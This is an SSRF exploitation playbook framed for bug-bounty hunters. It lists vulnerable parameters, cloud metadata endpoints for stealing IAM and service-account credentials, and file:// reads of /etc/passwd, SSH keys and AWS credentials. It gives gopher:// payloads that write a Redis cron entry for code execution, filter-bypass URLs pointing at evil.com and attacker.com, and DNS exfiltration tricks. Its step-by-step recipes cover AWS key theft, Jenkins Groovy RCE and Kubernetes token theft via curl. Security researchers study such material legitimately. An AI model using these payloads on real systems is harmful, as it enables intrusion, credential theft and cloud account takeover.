# SSRF Killchain — from blind ping to $25K cloud takeover

> The H1 leaderboard is full of SSRF: Dropbox $17,576 (Google Drive full-response SSRF), GitLab $10K (project import), Mail.ru/PlayStation/Evernote AWS-metadata chains.

---

## SURFACE — where SSRF lives

Every parameter that fetches a URL on the server's behalf:

```
url=, image=, image_url=, src=, source=, target=, dest=, redirect=, callback=, return_to=,
proxy=, fetch=, link=, ref=, r=, file=, document=, doc=, host=, domain=, dns=, server=,
webhook=, webhook_url=, callback_url=, notify_url=, ping=, heartbeat=,
import=, import_url=, remote_attachment_url=, avatar_url=, profile_image_url=,
preview_url=, screenshot=, render=, pdf=, html2pdf=, og_url=, embed=, oembed=,
xml=, xml_url=, xsl=, xslt=, dtd=, schema=, wsdl=
```

Also: SOAP request bodies, GraphQL string args, file metadata fields (PDF link annotations, Office hyperlink, RSS/OPML import), webhook configuration UI.

---

## STAGE 1 — DETECTION

**Use a callback / OAST tool**: Burp Collaborator, interactsh, ngrok, requestbin, webhook.site.

```bash
# interactsh
interactsh-client -v
# Use the generated host as your payload destination
```

Test order (least-noisy first):
1. `http://$YOU.oast.fun/` -> if you see a hit, full SSRF
2. `http://burp-collab.example/` with response body -> full-response
3. `https://target/redirect?url=http://$YOU` -> SSRF via redirect chain
4. Blind: server-side fetch but no response — confirm via OAST timing

---

## STAGE 2 — IMPACT ESCALATION (THE $10K GATE)

A blind SSRF that pings your collaborator pays $200-$500. To break $10K, you need one of:

### A. Cloud metadata extraction

| Cloud | Endpoint | Notes |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | IMDSv1; for IMDSv2 you need PUT token first |
| AWS IMDSv2 | PUT `http://169.254.169.254/latest/api/token` X-aws-ec2-metadata-token-ttl-seconds: 21600, then GET with X-aws-ec2-metadata-token | hard if SSRF only allows GET |
| GCP | `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` Header: Metadata-Flavor: Google | header required |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` Header: Metadata: true | header required |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | |
| Oracle Cloud | `http://192.0.0.192/latest/` | |
| Kubernetes Pod | `http://169.254.169.254/latest/dynamic/instance-identity/document` for AWS EKS | |

Then with the cloud creds: list S3 buckets, read source code from build artifacts, list secrets in SSM/Parameter Store, or assume role into other accounts.

### B. Internal service access

```
http://127.0.0.1:6379    Redis - CONFIG SET dir, dbfilename, save -> RCE via cron/SSH
http://127.0.0.1:8500    Consul - read kv, register service
http://127.0.0.1:8200    Vault - read secrets
http://127.0.0.1:9200    Elasticsearch - search _all
http://127.0.0.1:5984    CouchDB - admin
http://127.0.0.1:11211   Memcache - leak session tokens
http://127.0.0.1:8080    Internal admin / Jenkins / Spring Actuator
http://127.0.0.1:15672   RabbitMQ
http://10.x.x.x:80       Internal services (often unauthenticated)
http://kube-apiserver    Kubernetes - if no auth from inside pod
http://metadata          GCP shorthand
```

### C. File read via `file://`

```
file:///etc/passwd
file:///proc/self/environ      (env vars - secrets!)
file:///proc/self/cmdline
file:///proc/self/cwd/config.yml
file:///root/.aws/credentials
file:///root/.ssh/id_rsa
file:///var/run/secrets/kubernetes.io/serviceaccount/token   (SA token in pod)
```

### D. gopher:// for full TCP smuggling

If parser allows `gopher://`, you can write arbitrary bytes to internal TCP services:

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$N%0d%0a<crontab>...
```

`Gopherus` tool generates payloads for Redis/MySQL/SMTP/MongoDB.

---

## STAGE 3 — BYPASS TECHNIQUES (when allowlist/denylist is in the way)

### DNS rebinding
Server resolves `evil.com` -> attacker IP for first request (allowed by allowlist), then DNS TTL expires and second request resolves to `127.0.0.1` / `169.254.169.254`. Tools: `singularity`, `rbndr.us`, `1u.ms`, your own.

### IPv6 / dual-stack
- `[::1]`, `[::ffff:127.0.0.1]`, `[0:0:0:0:0:ffff:127.0.0.1]`, `[::ffff:7f00:1]`
- IPv4-mapped IPv6: `::ffff:a9fe:a9fe` (= 169.254.169.254)

### Decimal / octal / hex / mixed
- `2130706433` (decimal) = 127.0.0.1
- `0177.0.0.1` (octal) = 127.0.0.1
- `0x7f000001` = 127.0.0.1
- `127.1`, `127.0.1`, `0`, `0.0.0.0`
- `127.000.000.001`

### URL parser confusion (the gold)
Python urllib vs requests vs ssrf-filter all parse differently:
```
http://evil.com#@127.0.0.1/
http://evil.com:80@127.0.0.1/
http://127.0.0.1.evil.com/    (DNS wildcard CNAME -> 127.0.0.1)
http://[::]:80/
http://①②⑦.0.0.1/             (Unicode digits)
http://127.0.0.1%23.evil.com/
http://0/                     (resolves to 0.0.0.0 -> 127.0.0.1 on Linux)
http://localhost\@evil.com/
```

### Open-redirect chain (target whitelists allowed domains)
Find an open redirect on an allowed domain:
```
url=https://allowed.target.com/redirect?next=http://169.254.169.254/...
```

### Suffix / regex bugs
- `https://allowed.com.evil.com` (suffix not anchored)
- `https://evil.com/allowed.com` (substring match)
- Trailing dot: `https://allowed.com.` (DNS still works, regex may differ)

### Protocol switch
If only `https://` checked, try `gopher://`, `dict://`, `ldap://`, `ftp://`, `file://`, `jar:`, `netdoc:`, `sftp://`.

### CRLF in URL -> request smuggling style
```
http://attacker.com/%0d%0aHost: 169.254.169.254%0d%0a%0d%0a
```

---

## STAGE 4 — BLIND SSRF -> SEMI-FULL

If response body isn't returned, exfil via:
- DNS: prepend extracted data as subdomain — `http://$DATA.you.oast.fun/`
- Time-based (boolean): `http://127.0.0.1:port/?if-true-take-long-path`
- Status code: many fetchers return error code differently for 200 vs 500

---

## STAGE 5 — ESCALATION RECIPES (highest payouts)

### Recipe 1 — AWS keys -> S3 source code -> harder bugs
1. SSRF -> IMDSv1 -> `iam/security-credentials/<role>` -> AccessKey + SecretKey + Token
2. `aws sts get-caller-identity`
3. `aws s3 ls` — find buckets containing `source-code`, `backups`, `logs`
4. Read source -> hunt API keys, signing secrets, more vulns
5. Read CloudTrail logs -> understand admin actions
6. `aws iam list-attached-role-policies` -> if AdministratorAccess, the chain is complete

### Recipe 2 — SSRF -> Redis -> RCE via cron
1. Confirm gopher:// works
2. Use Gopherus to write a cron entry inside Redis
3. CONFIG SET dir /var/spool/cron/, dbfilename root, BGSAVE
4. Cron runs your command on next minute boundary

### Recipe 3 — SSRF -> internal Jenkins -> Groovy -> RCE
1. Jenkins on `internal:8080`, often no auth from internal network
2. POST `/script` with Groovy: ``"id".execute().text``
3. Often runs as root or jenkins user with SSH keys to other hosts

### Recipe 4 — SSRF -> K8s API -> token theft
1. From inside pod, read `/var/run/secrets/kubernetes.io/serviceaccount/token`
2. `curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes/api/v1/namespaces/.../secrets`
3. Find secrets across namespaces -> cross-tenant if multi-tenant cluster

### Recipe 5 — Webhook SSRF -> internal CI -> credential theft
1. App allows webhook URL in user settings
2. Set webhook URL = internal CI like `http://buildkite.internal/api/`
3. CI returns build logs containing secrets

---

## VALIDATION CHECKLIST

1. Confirm server-side via OAST or unique reflected content.
2. Note timing: blind SSRF often takes 5-10s vs DNS rebind 60s+.
3. Demonstrate at least one of: cloud metadata creds, internal service hit, file read, port scan signal.
4. NEVER pivot beyond what's needed for impact (no random S3 reads, no production data exfil).
5. Capture: full HTTP request, server response, and screenshot of OAST hit.

---

## TOOLING

- `interactsh-client`, Burp Collaborator, requestbin, ngrok
- `Gopherus` (gopher payloads for Redis/MySQL/SMTP)
- `singularity` (DNS rebinding)
- `SSRFmap` (auto-exploit)
- `nuclei` SSRF templates: `http/cves/**/*ssrf*`, `http/exposed-panels/aws-metadata-*`
